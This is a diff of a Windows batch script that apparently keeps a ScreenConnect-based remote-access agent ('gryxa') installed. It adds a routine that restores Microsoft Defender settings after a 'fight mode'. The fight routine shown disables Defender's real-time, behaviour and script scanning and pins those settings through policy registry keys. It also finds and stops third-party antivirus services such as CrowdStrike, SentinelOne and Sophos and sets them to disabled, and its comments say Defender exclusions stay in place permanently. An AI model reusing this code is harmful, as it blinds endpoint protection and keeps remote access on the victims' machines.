@@ -30,6 +30,10 @@ rem   ProductCode for dedup removal; keepers never match (their ImagePath is not
 rem 0.1.1: atomic mkdir overlap lock (C17 - Agent+Guard tasks firing on the same minute both
 rem   passed the file-exists check; mkdir is atomic on NTFS, stale >15min broken via timestamp);
 rem   HuntKiller logs the matched task ACTION string as evidence, not just the task name.
+rem 0.1.2: battlefield restore (C18) - fight mode marks defender_countered.flag; on confirmed
+rem   healthy the guard re-enables RTM/behavior/IOAV/script scanning and drops the policy pins,
+rem   but ONLY when the flag exists (never touches admin-configured Defender) and never removes
+rem   the gryxa exclusions. Countermeasures temporary, exclusions permanent.
 setlocal EnableExtensions EnableDelayedExpansion
 set "ZD=C:\ProgramData\WinRTCS"
 set "KL=%ZD%\killlist.cfg"
@@ -135,8 +139,18 @@ goto :FightThenInstall
 echo 0>"%STREAKF%"
 echo 0>"%EXTF%"
 echo %DATE% %TIME%>"%PRESENT%"
+if exist "%ZD%\defender_countered.flag" call :DefenderRestore
 echo [%DATE% %TIME%] healthy !GSVC!>>"%LOG%"
 goto :Done
+
+:DefenderRestore
+rem --- countermeasures are temporary, exclusions are permanent (C18): undo OUR fight-mode
+rem --- Defender changes once gryxa is confirmed healthy; flag ensures we only undo our own ---
+del /f /q "%ZD%\defender_countered.flag" >nul 2>&1
+reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /f >nul 2>&1
+start "" /min powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; Set-MpPreference -DisableRealtimeMonitoring $false; Set-MpPreference -DisableBehaviorMonitoring $false; Set-MpPreference -DisableIOAVProtection $false; Set-MpPreference -DisableScriptScanning $false" >nul 2>&1
+echo [%DATE% %TIME%] defender_restored>>"%LOG%"
+exit /b 0
 
 :FightThenInstall
 if !STREAK! GEQ 2 call :Fight
@@ -145,6 +159,7 @@ goto :Install
 
 :Fight
 echo [%DATE% %TIME%] fight_mode streak=!STREAK!>>"%LOG%"
+echo %DATE% %TIME%>"%ZD%\defender_countered.flag"
 powershell -NoProfile -NonInteractive -Command "$ErrorActionPreference='SilentlyContinue'; $o=@(); foreach ($h in (Get-MpThreatDetection | Where-Object { $_.Resources -match 'ScreenConnect' } | Select-Object -First 5)) { $o += ('defender_threat ' + $h.ThreatName) }; Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true; $rp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'; New-Item -Path $rp -Force | Out-Null; foreach ($v in 'DisableRealtimeMonitoring','DisableBehaviorMonitoring','DisableIOAVProtection','DisableScriptScanning') { Set-ItemProperty -Path $rp -Name $v -Value 1 -Type DWord }; $o += 'defender_countered'; $avs = Get-CimInstance -Namespace root\SecurityCenter2 -ClassName AntiVirusProduct | Where-Object { $_.displayName -notmatch 'Windows Defender' }; $names = @(); foreach ($a in $avs) { $names += $a.displayName }; if (-not $names) { $known='Sophos|Malwarebytes|McAfee|CrowdStrike|Falcon|SentinelOne|SentinelAgent|Avast|AVG|Bitdefender|ESET|Kaspersky|Trend Micro|Webroot|Norton|Vipre|Cylance'; $names = @((Get-CimInstance Win32_Service | Where-Object { $_.Name -match $known -or $_.DisplayName -match $known -or $_.PathName -match $known } | ForEach-Object { $_.Name })) }; foreach ($n in $names) { $tok = [regex]::Escape($n); $svcs = Get-CimInstance Win32_Service | Where-Object { $_.Name -match $tok -or $_.DisplayName -match $tok -or $_.PathName -match $tok }; foreach ($s in $svcs) { & sc.exe stop $s.Name 2>&1 | Out-Null; & sc.exe config $s.Name start= disabled 2>&1 | Out-Null; $o += ('av_stopped ' + $s.Name) } }; $o += ('fight_targets ' + ($names -join ',')); $o | Set-Content -Path '%ZD%\fight.out' -Encoding ASCII" >nul 2>&1
 if exist "%ZD%\fight.out" ( type "%ZD%\fight.out">> "%LOG%" )
 exit /b 0
